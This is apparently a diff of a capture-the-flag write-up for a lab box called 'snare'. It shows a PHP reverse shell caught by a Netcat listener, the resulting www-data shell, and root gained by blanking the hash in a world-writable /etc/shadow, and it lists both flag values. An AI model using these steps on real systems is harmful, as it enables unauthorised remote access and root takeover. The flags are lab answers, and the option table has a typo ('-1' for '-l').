@@ -74,16 +74,121 @@ On Kali, use the Pentestmonkey PHP reverse shell located at: [page:1]
 
 Edit it to set your VPN IP and listening port:
 
-        $ip   = '10.150.150.XXX'; // Your VPN IP
-        $port = 1234;             // Your listening port
-        ``` [page:1]
+$ip   = '10.150.150.XXX'; // Your VPN IP
+$port = 1234;             // Your listening port [page:1]
 
-### 5.2 Set Up a Netcat Listener
+## 5.2 Set Up a Netcat Listener
 
 On your attacking machine, start a Netcat listener **before** triggering the shell: [page:1]
 
-```bash
-nc -lvnp 1234
+        nc -lvnp 1234
+
+<img width="415" height="69" alt="image" src="https://github.com/user-attachments/assets/1c753433-f766-4686-aadf-f5e3f041536d" />
+
+| Option | Description       |
+|--------|-------------------|
+| `-1`   | Listen mode       |
+| `-v`   | Verbose           |
+| `-n`   | No DNS resolution |
+| `-p`   | Port number       |
+
+
+## 5.3 Upload and Trigger the Shell
+
+Upload the PHP reverse shell through the vulnerable upload or inclusion mechanism, then browse to the uploaded file to execute it. [page:1]
+
+## 5.4 Shell Received
+        
+        listening on [any] 1234 ...
+        connect to [10.150.150.XXX] from (UNKNOWN) [10.150.150.18] XXXXX
+        Linux snare 4.19.0-16-amd64 ...
+        $ id
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+<img width="834" height="198" alt="image" src="https://github.com/user-attachments/assets/478dd807-3850-42a7-ab0a-5e5b99cd14ca" />
+
+You now hold a shell as `www-data`. [page:1]
+
+# 6. Flag 1 — Initial Foothold
+
+With the web shell running, search the filesystem for the first flag. [page:1]
+
+        cat /path/to/flag1
+
+Flag 1: e335462da856f39997bffdc04b8d89ce1104fcc5 [page:1]
+
+# 7. Privilege Escalation — /etc/shadow
+
+## 7.1 Check for Write Access
+
+Enumerate writable files and potential privilege escalation vectors from `www-data`. [page:1]
+
+        find / -writable -type f 2>/dev/null | grep -v proc
+
+The file /etc/shadow is shown as world-writable, which is a critical misconfiguration. [page:1]
+
+<img width="809" height="562" alt="image" src="https://github.com/user-attachments/assets/54d42cd8-233f-4c79-add8-754be6b477df" />
+
+## 7.2 Read the Shadow File
+
+Open the shadow file with `vim`: [page:1]
+
+        vim /etc/shadow
+
+Copy the first two lines (root and the next user) for reference. [page:1]
+
+A root entry looks like:
+
+        root:$6$<hash>:18586:0:99999:7:::
+        [page:1]
+
+## 7.3 Remove the Root Password Hash
+
+In `vim`, navigate to the `root` line and remove the password hash, leaving the field empty; this sets root’s password to blank. [page:1]
+
+The modified line should be:
+
+        text
+        root::18586:0:99999:7:::
+        [page:1]
+        
+Save and quit:
+
+        vim:wq!
+
+<img width="655" height="398" alt="image" src="https://github.com/user-attachments/assets/4ee2497a-a3bd-4f4c-bdfc-7250103f47e5" />
+
+## 7.4 Switch to Root
+
+Now switch to root using the empty password: [page:1]
+
+        su root
+
+Press Enter when prompted for password
+
+Verify root access:
+
+id
+
+        # uid=0(root) gid=0(root) groups=0(root)
+
+whoami
+
+        # root
+
+# 8. Flag 2 — Root Access
+
+As root, move to the root home directory and read the second flag. [page:1]
+
+        cat /root/flag.txt
+
+If needed, search common locations:
+
+        find / -name "flag*" 2>/dev/null
+
+**Flag 2:** `2b0286a69b276189afe50517304963e5fa5982d9` [page:1]
+
+
 
 
 
